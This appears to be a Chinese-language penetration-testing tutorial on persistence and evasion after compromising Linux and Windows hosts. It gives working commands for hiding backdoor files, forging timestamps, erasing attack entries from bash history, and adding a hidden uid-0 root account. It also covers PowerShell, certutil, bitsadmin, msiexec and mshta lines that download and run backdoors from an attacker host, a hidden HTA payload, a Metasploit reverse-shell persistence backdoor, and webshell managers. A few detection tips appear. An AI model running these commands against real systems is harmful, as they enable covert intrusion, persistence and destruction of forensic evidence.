+<figure id="orgdb1447f">
+<img style="aspect-ratio:1582/284" decoding="async" loading="lazy" src="./images/img_20230816_170239.webp" alt="img_20230816_170239.webp" width="50%">
+
+</figure>
+</div>
+</div>
+</div>
+<div id="outline-container-h:8c92ed0e-6ef1-4d7d-9886-8346e044a9f4" class="outline-3">
+<h3 id="h:8c92ed0e-6ef1-4d7d-9886-8346e044a9f4"><a href="#h:8c92ed0e-6ef1-4d7d-9886-8346e044a9f4">Linux权限维持-隐藏篇</a></h3>
+<div class="outline-text-3" id="text-h:8c92ed0e-6ef1-4d7d-9886-8346e044a9f4">
+<p>
+<b>使用环境：CentOS</b>
+</p>
+
+<p>
+攻击者在获取Linux服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件。
+</p>
+</div>
+<div id="outline-container-h:7c9b829f-c16b-43a5-bdc4-c4d7ba3266f8" class="outline-4">
+<h4 id="h:7c9b829f-c16b-43a5-bdc4-c4d7ba3266f8"><a href="#h:7c9b829f-c16b-43a5-bdc4-c4d7ba3266f8">隐藏文件</a></h4>
+<div class="outline-text-4" id="text-h:7c9b829f-c16b-43a5-bdc4-c4d7ba3266f8">
+<p>
+Linux 下创建一个隐藏文件：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">touch .1.txt
+</pre>
+</div>
+
+<p>
+touch 命令可以创建一个文件，文件名前面加一个点就代表是隐藏文件，如下图：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">[root@jump test]# touch .1.txt
+[root@jump test]# ls 
+[root@jump test]# ls -a
+.  ..  .1.txt
+[root@jump test]# ls -al
+total 0
+drwxr-xr-x. 2 root root  20 Jun 29 23:07 .
+drwxr-xr-x. 4 root root 117 Jun 29 23:07 ..
+-rw-r--r--. 1 root root   0 Jun 29 23:07 .1.txt
+</pre>
+</div>
+
+
+<p>
+一般的Linux下的隐藏目录使用命令 ls -l 是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令： ls -la
+</p>
+
+<p>
+这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。
+</p>
+
+<p>
+如 <i>temp</i>.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">[root@jump test]# ls -al /tmp
+total 4
+drwxrwxrwt. 11 root root 260 Jun 29 23:07 .
+dr-xr-xr-x. 19 root root 248 Jun 21 05:21 ..
+drwxrwxrwt.  2 root root  40 Jun 20 14:11 .ICE-unix
+drwxrwxrwt.  2 root root  40 Jun 20 14:11 .X11-unix
+drwxrwxrwt.  2 root root  40 Jun 20 14:11 .XIM-unix
+drwxrwxrwt.  2 root root  40 Jun 20 14:11 .font-unix
+-rw-------.  1 root root   0 Jun 20 23:27 62291b61.eksctl.lock
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:87e115d3-9cd8-430b-a0db-aec09e79f61e" class="outline-4">
+<h4 id="h:87e115d3-9cd8-430b-a0db-aec09e79f61e"><a href="#h:87e115d3-9cd8-430b-a0db-aec09e79f61e">隐藏文件时间戳</a></h4>
+<div class="outline-text-4" id="text-h:87e115d3-9cd8-430b-a0db-aec09e79f61e">
+<p>
+Linux下隐藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。
+</p>
+
+<p>
+将时间戳修改成某年某月某日。如下修改文件时间戳为：2019年08月08日。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">-t [[CC]YY]MMDDhhmm[.ss] &#25351;&#23450;atime&#21644;mtime&#30340;&#26102;&#38388;&#25139; ,&#22914;&#65306;07081556&#20195;&#34920;7&#26376;8&#21495;15&#28857;56&#20998;
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#25351;&#23450;&#24180;&#26376;&#26085;&#26102;&#20998;&#31186;
+</span>touch -t 1908081042.30 .1.txt 
+[root@jump test]# ls -al --full-time
+-rw-r--r--. 1 root root   0 2019-08-08 10:42:30.000000000 +0000 .1.txt
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#25351;&#23450;&#24180;&#26376;&#26085;&#26102;&#20998;&#31186;
+</span>touch -t 202001151042.30 .1.txt 
+[root@jump test]# ls -al --full-time
+-rw-r--r--. 1 root root   0 2020-01-15 10:42:30.000000000 +0000 .1.txt
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#25351;&#23450;&#26376;&#26085;&#26102;&#20998;
+</span>touch -mt 02051101 .1.txt 
+[root@jump test]# ls -al --full-time
+-rw-r--r--. 1 root root   0 2025-02-05 11:01:00.000000000 +0000 .1.txt
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:4beedc56-2f95-4ce4-8147-00b6726cca9c" class="outline-4">
+<h4 id="h:4beedc56-2f95-4ce4-8147-00b6726cca9c"><a href="#h:4beedc56-2f95-4ce4-8147-00b6726cca9c">隐藏权限</a></h4>
+<div class="outline-text-4" id="text-h:4beedc56-2f95-4ce4-8147-00b6726cca9c">
+<p>
+在Linux中，使用chattr命令为文件添加锁定属性，来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">chattr +i evil.php          <span class="org-comment-delimiter">#</span><span class="org-comment">&#20026;&#25991;&#20214;&#28155;&#21152;&#38145;&#23450;&#23646;&#24615;
+</span>lsattr evil.php             <span class="org-comment-delimiter">#</span><span class="org-comment">&#23646;&#24615;&#26597;&#30475;
+</span>chattr -i evil.php          <span class="org-comment-delimiter">#</span><span class="org-comment">&#35299;&#38500;&#38145;&#23450;
+</span>rm -rf evil.php             <span class="org-comment-delimiter">#</span><span class="org-comment">&#21024;&#38500;&#25991;&#20214;</span>
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:a388aa4a-f3b5-4044-849c-3b412c075e9d" class="outline-4">
+<h4 id="h:a388aa4a-f3b5-4044-849c-3b412c075e9d"><a href="#h:a388aa4a-f3b5-4044-849c-3b412c075e9d">隐藏历史操作命令</a></h4>
+<div class="outline-text-4" id="text-h:a388aa4a-f3b5-4044-849c-3b412c075e9d">
+<p>
+如果在shell中执行的命令，不希望被记录在历史命令中，如何在Linux中开启无痕操作模式呢？
+</p>
+
+<p>
+技巧一：只针对你的操作关闭历史记录
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#20020;&#26102;&#31105;&#29992;&#21382;&#21490;&#35760;&#24405;
+</span>[space]set +o history
+</pre>
+</div>
+
+<p>
+上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史命令中，然而这个命令之前的所有东西都会原样记录在历史命令中。
+</p>
+
+<p>
+要重新开启历史功能，执行下面的命令：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">[Space]set -o history &#23427;&#23558;&#29615;&#22659;&#24674;&#22797;&#21407;&#29366;&#65292;&#20063;&#23601;&#26159;&#20320;&#23436;&#25104;&#20102;&#20320;&#30340;&#24037;&#20316;&#65292;&#25191;&#34892;&#19978;&#36848;&#21629;&#20196;&#20043;&#21518;&#30340;&#21629;&#20196;&#37117;&#20250;&#20986;&#29616;&#22312;&#21382;&#21490;&#20013;&#12290; 
+</pre>
+</div>
+
+<p>
+技巧二：从历史记录中删除指定的命令
+假设历史命令中已经包含了一些你不希望记录的命令，这种情况下我们怎么办？很简单，通过下面的命令来删除：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-builtin">history</span> | grep <span class="org-string">"keyword"</span>
+</pre>
+</div>
+
+<p>
+输出历史记录中匹配的命令，每一条命令前面会有个数字。从历史记录中删除指定的项：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-builtin">history</span> -d [num]
+</pre>
+</div>
+
+<p>
+这种技巧是关键记录删除，其他情况比如前150行是用户的正常操作记录，150以后是攻击者操作记录。
+我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">sed -i <span class="org-string">'150,$d'</span> .bash_history
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:700f5d3c-290f-452f-90e8-e2055a96cdd9" class="outline-3">
+<h3 id="h:700f5d3c-290f-452f-90e8-e2055a96cdd9"><a href="#h:700f5d3c-290f-452f-90e8-e2055a96cdd9">Linux权限维持-后门篇</a></h3>
+<div class="outline-text-3" id="text-h:700f5d3c-290f-452f-90e8-e2055a96cdd9">
+<p>
+<b>使用环境：Kali Linux</b>
+</p>
+</div>
+<div id="outline-container-h:a7913564-0810-46e7-9577-b4c9a0f96db6" class="outline-4">
+<h4 id="h:a7913564-0810-46e7-9577-b4c9a0f96db6"><a href="#h:a7913564-0810-46e7-9577-b4c9a0f96db6">一句话添加用户和密码</a></h4>
+<div class="outline-text-4" id="text-h:a7913564-0810-46e7-9577-b4c9a0f96db6">
+<p>
+添加普通用户：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">&#21019;&#24314;&#19968;&#20010;&#29992;&#25143;&#21517;guest&#65292;&#23494;&#30721;123456&#30340;&#26222;&#36890;&#29992;&#25143;
+</span>useradd -p <span class="org-sh-quoted-exec">`openssl passwd -6 -salt 'salt' 123456`</span> guest
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">useradd -p &#26041;&#27861; ` ` &#26159;&#29992;&#26469;&#23384;&#25918;&#21487;&#25191;&#34892;&#30340;&#31995;&#32479;&#21629;&#20196;,"$()"&#20063;&#21487;&#20197;&#23384;&#25918;&#21629;&#20196;&#25191;&#34892;&#35821;&#21477;
+</span>useradd -p <span class="org-string">"$(openssl passwd -1 123456)"</span> guest
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">chpasswd&#26041;&#27861;
+</span>useradd guest;<span class="org-builtin">echo</span> <span class="org-string">'guest:123456'</span>|chpasswd
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">echo -e&#26041;&#27861;
+</span>useradd test;<span class="org-builtin">echo</span> -e <span class="org-string">"123456\n123456\n"</span> |passwd test
+</pre>
+</div>
+
+<p>
+添加root用户：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">&#21019;&#24314;&#19968;&#20010;&#29992;&#25143;&#21517;guest&#65292;&#23494;&#30721;123456&#30340;root&#29992;&#25143;
+</span>useradd -p <span class="org-sh-quoted-exec">`openssl passwd -1 -salt 'salt' 123456`</span> guest1 -o -u 0 -g root -G root -s /bin/bash -d /home/test
+
+]# su guest
+]# whoami
+root
+</pre>
+</div>
+
+<p>
+可疑用户排查技巧：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">&#26597;&#35810;&#29305;&#26435;&#29992;&#25143;&#29305;&#26435;&#29992;&#25143;(uid &#20026;0)
+</span>awk -F: <span class="org-string">'$3==0{print $1}'</span> /etc/passwd
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#26597;&#35810;&#21487;&#20197;&#36828;&#31243;&#30331;&#24405;&#30340;&#36134;&#21495;&#20449;&#24687;
+</span>awk <span class="org-string">'/\$1|\$6/{print $1}'</span> /etc/shadow
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#38500;root&#36134;&#21495;&#22806;&#65292;&#20854;&#20182;&#36134;&#21495;&#26159;&#21542;&#23384;&#22312;sudo&#26435;&#38480;&#12290;&#22914;&#38750;&#31649;&#29702;&#38656;&#35201;&#65292;&#26222;&#36890;&#36134;&#21495;&#24212;&#21024;&#38500;sudo&#26435;&#38480;
+</span>more /etc/sudoers | grep -v <span class="org-string">"^#\|^$"</span> | grep <span class="org-string">"ALL=(ALL)"</span>
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:408294ae-7613-4498-82d2-f6322b12a9ae" class="outline-4">
+<h4 id="h:408294ae-7613-4498-82d2-f6322b12a9ae"><a href="#h:408294ae-7613-4498-82d2-f6322b12a9ae">SSH免密登录</a></h4>
+<div class="outline-text-4" id="text-h:408294ae-7613-4498-82d2-f6322b12a9ae">
+<p>
+在客户端上生成一对公私钥，然后把公钥安装到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配，如果匹配成功就可以登录了。
+</p>
+
+<p>
+在服务器上执行命令：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">ssh-keygen -t rsa
+</pre>
+</div>
+
+<p>
+过程中按三次回车。
+</p>
+
+<p>
+进入/root/.ssh/文件夹查看内容，其中 id_rsa 为私钥， id_rsa.pub 为公钥。
+</p>
+
+<p>
+接下来需要在服务器上安装公钥，即将 id_rsa.pub 的内容追加到 <i>root</i>.ssh/authorized_keys 内：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cat id_rsa.pub &gt;&gt; authorized_keys
+</pre>
+</div>
+
+<p>
+vim /etc/ssh/sshd_config，开启密钥登录的认证方式：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">PermitRootLogin yes
+PubkeyAuthentication yes
+
+/etc/init.d/ssh start
+</pre>
+</div>
+
+<p>
+将私钥提取出来保存到本地，可以利用此密钥直接进行登录：
+</p>
+
+
+<figure id="org3379b3b">
+<img style="aspect-ratio:1584/252" decoding="async" loading="lazy" src="./images/img_20230817_133227.webp" alt="img_20230817_133227.webp" width="50%">
+
+</figure>
+
+
+
+<figure id="org5313077">
+<img style="aspect-ratio:892/886" decoding="async" loading="lazy" src="./images/img_20230817_133313.webp" alt="img_20230817_133313.webp" width="50%">
+
+</figure>
+
+
+
+<figure id="org34ba3b6">
+<img style="aspect-ratio:808/162" decoding="async" loading="lazy" src="./images/img_20230817_133328.webp" alt="img_20230817_133328.webp" width="50%">
+
+</figure>
+
+<p>
+排查技巧：查看 <i>root</i>.ssh/authorized_keys 是否被修改，结合文件时间戳、历史命令等进行排查。
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:44407d4b-cafe-4c37-abb2-015f359766fe" class="outline-3">
+<h3 id="h:44407d4b-cafe-4c37-abb2-015f359766fe"><a href="#h:44407d4b-cafe-4c37-abb2-015f359766fe">Windows命令行文件下载方式汇总</a></h3>
+<div class="outline-text-3" id="text-h:44407d4b-cafe-4c37-abb2-015f359766fe">
+<p>
+<b>使用环境：Windows Server 2008</b>
+</p>
+
+<p>
+当我们通过Web渗透获取了一个RCE漏洞，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？一般来说，实现Windows文件下载执行的方式主要如下：
+</p>
+
+<ul class="org-ul">
+<li>第一种，远程下载文件到本地，然后再执行；</li>
+<li>第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式。</li>
+</ul>
+
+<p>
+下面是常见的文件下载执行的方式：
+</p>
+</div>
+<div id="outline-container-h:ab2f6774-fca7-4761-9c74-de76620d5b4f" class="outline-4">
+<h4 id="h:ab2f6774-fca7-4761-9c74-de76620d5b4f"><a href="#h:ab2f6774-fca7-4761-9c74-de76620d5b4f">PowerShell</a></h4>
+<div class="outline-text-4" id="text-h:ab2f6774-fca7-4761-9c74-de76620d5b4f">
+<p>
+PowerShell是一种命令行外壳程序和脚本环境，使得命令行用户和脚本编写者可以利用。
+</p>
+
+<p>
+远程下载文件保存在本地：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#26032;&#24314;&#19968;&#20010;&#23545;&#35937;&#65292;&#31995;&#32479;&#23458;&#25143;&#31471;&#65292;&#36828;&#31243;&#19979;&#36733;&#25991;&#20214;&#24182;&#21629;&#21517;&#20026;one.exe
+</span><span class="org-function-name">powershell</span> (new-object System.Net.WebClient).DownloadFile(<span class="org-string">'http://192.168.85.1/one.exe'</span>,<span class="org-string">'one.exe'</span>)
+</pre>
+</div>
+
+<p>
+远程执行命令：以隐藏的方式下载并执行后门
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">powershell -nop -w hidden -c <span class="org-string">"IEX ((new-object net.webclient).downloadstring('http://192.168.85.1/one.exe'))"</span>
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:e0d3e37a-6e4e-4b23-af50-86283f941a20" class="outline-4">
+<h4 id="h:e0d3e37a-6e4e-4b23-af50-86283f941a20"><a href="#h:e0d3e37a-6e4e-4b23-af50-86283f941a20">Bitsadmin</a></h4>
+<div class="outline-text-4" id="text-h:e0d3e37a-6e4e-4b23-af50-86283f941a20">
+<p>
+bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">bitsadmin /transfer n http://192.168.85.1/one.exe .<span class="org-sh-escaped-newline">\</span>
+</pre>
+</div>
+
+
+<figure id="orgafae77e">
+<img style="aspect-ratio:1054/524" decoding="async" loading="lazy" src="./images/img_20230817_133742.webp" alt="img_20230817_133742.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:60c828e5-7c43-4253-83fd-6f3b2b3d1090" class="outline-4">
+<h4 id="h:60c828e5-7c43-4253-83fd-6f3b2b3d1090"><a href="#h:60c828e5-7c43-4253-83fd-6f3b2b3d1090">certutil</a></h4>
+<div class="outline-text-4" id="text-h:60c828e5-7c43-4253-83fd-6f3b2b3d1090">
+<p>
+用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。
+</p>
+
+<p>
+注：缓存目录为："%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content"
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#19979;&#36733;&#25991;&#20214;
+</span>certutil -urlcache -split -f http://192.168.85.1/one.exe one.exe
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#21024;&#38500;&#32531;&#23384;
+</span>certutil -urlcache -split -f http://192.168.85.1/one.exe one.exe delete
+</pre>
+</div>
+
+
+<figure id="org1f1c85c">
+<img style="aspect-ratio:1044/338" decoding="async" loading="lazy" src="./images/img_20230817_133936.webp" alt="img_20230817_133936.webp" width="50%">
+
+</figure>
+
+
+
+<figure id="orgb3f26fa">
+<img style="aspect-ratio:1184/176" decoding="async" loading="lazy" src="./images/img_20230817_134003.webp" alt="img_20230817_134003.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:eb0a9ced-2dd6-40f6-adf2-becbc562c802" class="outline-4">
+<h4 id="h:eb0a9ced-2dd6-40f6-adf2-becbc562c802"><a href="#h:eb0a9ced-2dd6-40f6-adf2-becbc562c802">msiexec</a></h4>
+<div class="outline-text-4" id="text-h:eb0a9ced-2dd6-40f6-adf2-becbc562c802">
+<p>
+msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#29983;&#25104;msi&#21253;&#20316;&#29992;&#26159;&#25191;&#34892;calc.exe
+</span>msfvenom -p windows/exec <span class="org-variable-name">CMD</span>=<span class="org-string">'calc.exe'</span> -f msi &gt; calc.msi
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#36828;&#31243;&#25191;&#34892;
+</span>msiexec /q /i http://192.168.85.1/calc.msi
+</pre>
+</div>
+
+<p>
+生成msi包
+</p>
+
+
+<figure id="org12019ca">
+<img style="aspect-ratio:1186/170" decoding="async" loading="lazy" src="./images/img_20230817_134122.webp" alt="img_20230817_134122.webp" width="50%">
+
+</figure>
+
+<p>
+远程执行
+</p>
+
+
+<figure id="org65f84fd">
+<img style="aspect-ratio:1184/416" decoding="async" loading="lazy" src="./images/img_20230817_134134.webp" alt="img_20230817_134134.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:31a4d5cd-9513-4200-b80a-802754bd7849" class="outline-4">
+<h4 id="h:31a4d5cd-9513-4200-b80a-802754bd7849"><a href="#h:31a4d5cd-9513-4200-b80a-802754bd7849">mshta</a></h4>
+<div class="outline-text-4" id="text-h:31a4d5cd-9513-4200-b80a-802754bd7849">
+<p>
+mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">mshta http://192.168.85.1/run.hta
+</pre>
+</div>
+
+
+<figure id="orge1f343d">
+<img style="aspect-ratio:1184/374" decoding="async" loading="lazy" src="./images/img_20230817_134207.webp" alt="img_20230817_134207.webp" width="50%">
+
+</figure>
+
+<p>
+run.hta内容为：
+</p>
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span class="org-function-name">HTML</span>&gt;
+&lt;<span class="org-function-name">meta</span> <span class="org-variable-name">http-equiv</span>=<span class="org-string">"Content-Type"</span> <span class="org-variable-name">content</span>=<span class="org-string">"text/html; charset=utf-8"</span>&gt;
+&lt;<span class="org-function-name">HEAD</span>&gt;
+  &lt;<span class="org-function-name">script</span> <span class="org-variable-name">language</span>=<span class="org-string">"VBScript"</span>&gt;
+    Window.ReSizeTo 0, 0
+    Window.moveTo -2000,-2000
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "calc.exe" // &#36825;&#37324;&#22635;&#20889;&#21629;&#20196;
+    self.close
+  &lt;/<span class="org-function-name">script</span>&gt;
+  &lt;<span class="org-function-name">body</span>&gt;
+    demo
+&lt;/<span class="org-function-name">body</span>&gt;
+&lt;/<span class="org-function-name">HEAD</span>&gt;
+&lt;/<span class="org-function-name">HTML</span>&gt;
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:36fd9f6b-9d03-47f4-9bdf-85ff4495777b" class="outline-3">
+<h3 id="h:36fd9f6b-9d03-47f4-9bdf-85ff4495777b"><a href="#h:36fd9f6b-9d03-47f4-9bdf-85ff4495777b">渗透测试框架权限维持技术</a></h3>
+<div class="outline-text-3" id="text-h:36fd9f6b-9d03-47f4-9bdf-85ff4495777b">
+<p>
+MSF维持权限的使用前提是先获得一个meterpreter shell，通过meterpreter shell获取持久性shell的方法如下：
+</p>
+</div>
+<div id="outline-container-h:4315d3f2-4cb0-426e-a7f4-c6942d761779" class="outline-4">
+<h4 id="h:4315d3f2-4cb0-426e-a7f4-c6942d761779"><a href="#h:4315d3f2-4cb0-426e-a7f4-c6942d761779">Persistence模块</a></h4>
+<div class="outline-text-4" id="text-h:4315d3f2-4cb0-426e-a7f4-c6942d761779">
+<p>
+通过启动项启动（persistence）的方式，在目标机器上以反弹回连。
+</p>
+<ul class="org-ul">
+<li>-U：设置后门在用户登录后自启动。该方式会在 HKCU\Software\Microsoft\Windows\CurrentVersion\Run 下添加注册表信息。</li>
+<li>-X：设置后门在系统启动后自启动。该方式会在 HKLM\Software\Microsoft\Windows\CurrentVersion\Run 下添加注册表信息。这里可能会由于环境 问题，导致添加失败，后门将无法启动。</li>
+<li>-S：作为服务自动启动代理程序（具有SYSTEM权限）</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#25552;&#21069;&#33719;&#24471;&#19968;&#20010;meterpreter&#21518;&#65292;&#22312;meterpreter&#20013;&#25191;&#34892;
+</span>run persistence -X -i 5 -p 9999 -r IP -P windows/x64/meterpreter/reverse_tcp
+
+-X   <span class="org-comment-delimiter">#</span><span class="org-comment">&#35774;&#32622;&#21518;&#38376;&#22312;&#31995;&#32479;&#21551;&#21160;&#21518;&#33258;&#21551;&#21160;&#12290;&#20250;&#22312; HKLM\Software\Microsoft\Windows\CurrentVersion\Run &#19979;&#28155;&#21152;&#27880;&#20876;&#34920;&#20449;&#24687;&#12290;
+</span>-i   <span class="org-comment-delimiter">#</span><span class="org-comment">&#35774;&#32622;&#22238;&#36830;&#30340;&#26102;&#38388;&#38388;&#38548;
+</span>-p   <span class="org-comment-delimiter">#</span><span class="org-comment">&#35774;&#32622;&#30417;&#25511;&#30340;&#31471;&#21475;&#65292;windows&#27809;&#26377;&#34987;&#21344;&#29992;&#30340;&#31471;&#21475;
+</span>-r   <span class="org-comment-delimiter">#</span><span class="org-comment">&#22238;&#36830;&#22320;&#22336;&#65292;kali &#26381;&#21153;&#22120;&#30340;&#22320;&#22336;
+</span>-&#22823;P <span class="org-comment-delimiter">#</span><span class="org-comment">&#25351;&#23450;payload</span>
+</pre>
+</div>
+
+
+
+<figure id="org5945b1a">
+<img style="aspect-ratio:1580/360" decoding="async" loading="lazy" src="./images/img_20230817_134541.webp" alt="img_20230817_134541.webp" width="50%">
+
+</figure>
+
+<p>
+生成的相关文件位置 ：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">&#21518;&#38376;&#25991;&#20214;&#20301;&#32622;&#65306;
+</span>C:\Windows\Temp C:\Users\Administrator\AppData\Local\Temp
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#27880;&#20876;&#34920;&#20301;&#32622;&#65306;
+</span>HKCU\Software\Microsoft\Windows\CurrentVersion\Run<span class="org-sh-escaped-newline">\</span>
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run<span class="org-sh-escaped-newline">\</span>
+</pre>
+</div>
+
+
+<figure id="org409c44e">
+<img style="aspect-ratio:1578/300" decoding="async" loading="lazy" src="./images/img_20230817_134643.webp" alt="img_20230817_134643.webp" width="50%">
+
+</figure>
+
+
+<figure id="org3e5351d">
+<img style="aspect-ratio:1924/256" decoding="async" loading="lazy" src="./images/img_20230817_140515.webp" alt="img_20230817_140515.webp" width="50%">
+
+</figure>
+
+<p>
+在Kali中修改监听端口为9999，重新启动目标机器，即可再次收到会话。
+</p>
+
+
+<figure id="org6bc5f56">
+<img style="aspect-ratio:1570/284" decoding="async" loading="lazy" src="./images/img_20230817_134704.webp" alt="img_20230817_134704.webp" width="50%">
+
+</figure>
+</div>
+</div>
+</div>
+<div id="outline-container-h:094b5985-c8f5-4291-a93a-06a33a248be2" class="outline-3">
+<h3 id="h:094b5985-c8f5-4291-a93a-06a33a248be2"><a href="#h:094b5985-c8f5-4291-a93a-06a33a248be2">常见Webshell管理工具</a></h3>
+<div class="outline-text-3" id="text-h:094b5985-c8f5-4291-a93a-06a33a248be2">
+</div>
+<div id="outline-container-h:8ba72ce5-0cbf-4ee5-8f05-c907a5403104" class="outline-4">
+<h4 id="h:8ba72ce5-0cbf-4ee5-8f05-c907a5403104"><a href="#h:8ba72ce5-0cbf-4ee5-8f05-c907a5403104">菜刀</a></h4>
+<div class="outline-text-4" id="text-h:8ba72ce5-0cbf-4ee5-8f05-c907a5403104">
+<p>
+中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理。在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。攻击特征比较明显没有做加密，容易被各安全设备检测到。
+</p>
+
+<p>
+工具地址：<a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a>
+</p>
+
+
+<figure id="org673c7d5">
+<img style="aspect-ratio:1574/448" decoding="async" loading="lazy" src="./images/img_20230817_140615.webp" alt="img_20230817_140615.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:0ec98395-b1e8-4bfe-a106-bd6d8c19b2ea" class="outline-4">
+<h4 id="h:0ec98395-b1e8-4bfe-a106-bd6d8c19b2ea"><a href="#h:0ec98395-b1e8-4bfe-a106-bd6d8c19b2ea">蚁剑</a></h4>
+<div class="outline-text-4" id="text-h:0ec98395-b1e8-4bfe-a106-bd6d8c19b2ea">
+<p>
+AntSword是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及具有权限和/或授权的安全研究人员以及网站管理员的需求。
+</p>
+
+<p>
+工具地址：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a>
+</p>
+
+
+<figure id="org42174cc">
+<img style="aspect-ratio:1554/624" decoding="async" loading="lazy" src="./images/img_20230817_140628.webp" alt="img_20230817_140628.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:c2a5d40f-3e49-478e-ad2b-c38075584820" class="outline-4">
+<h4 id="h:c2a5d40f-3e49-478e-ad2b-c38075584820"><a href="#h:c2a5d40f-3e49-478e-ad2b-c38075584820">冰蝎</a></h4>
+<div class="outline-text-4" id="text-h:c2a5d40f-3e49-478e-ad2b-c38075584820">
+<p>
+冰蝎是一款动态二进制加密网站管理客户端。java开发。最大的特点是会对交互的流量进行一个aes对称加密并用加密的密钥是随机生成的，客户端的流量几乎很难做检测。
+</p>
+
+<p>
+工具地址：<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a>
+</p>
+
+
+<figure id="org96d453e">
+<img style="aspect-ratio:1584/174" decoding="async" loading="lazy" src="./images/img_20230817_140649.webp" alt="img_20230817_140649.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:336be93e-5b56-4497-9dde-f92d4f9be35c" class="outline-4">
+<h4 id="h:336be93e-5b56-4497-9dde-f92d4f9be35c"><a href="#h:336be93e-5b56-4497-9dde-f92d4f9be35c">哥斯拉</a></h4>
+<div class="outline-text-4" id="text-h:336be93e-5b56-4497-9dde-f92d4f9be35c">
+<p>
+哥斯拉是一款优秀的权限管理工具，内置了3种Payload以及6种加密器，6种支持脚本后缀，20个内置插件。
+</p>
+
+<p>
+工具地址：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a>
+</p>
+
+
+<figure id="orga5d7cdf">
